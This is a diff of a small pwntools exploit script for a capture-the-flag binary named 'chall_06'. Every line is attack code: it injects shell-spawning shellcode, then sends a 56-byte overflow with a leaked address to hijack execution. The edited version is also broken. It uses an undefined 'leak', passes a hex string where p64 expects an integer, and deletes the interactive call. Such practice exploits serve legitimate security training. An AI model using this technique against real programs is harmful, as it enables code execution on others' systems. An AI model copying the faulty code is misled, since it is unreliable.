@@ -1,18 +1,7 @@
 from pwn import *
-
-binary = context.binary = ELF('./chall_06')
-
 p = process('./chall_06')
 p.recv()
+binary = context.binary = ELF('./chall_06')
+p.sendline(b'' + asm(shellcraft.sh()))
 
-payload  = b''
-payload += asm(shellcraft.sh())
-
-p.sendline(payload)
-
-payload  = b''
-payload += 56 * b'A'
-payload += p64(leak)
-
-p.sendline(payload)
-p.interactive()
+p.sendline(b'' + 56*b'A' + p64(hex(int(leak,16))))
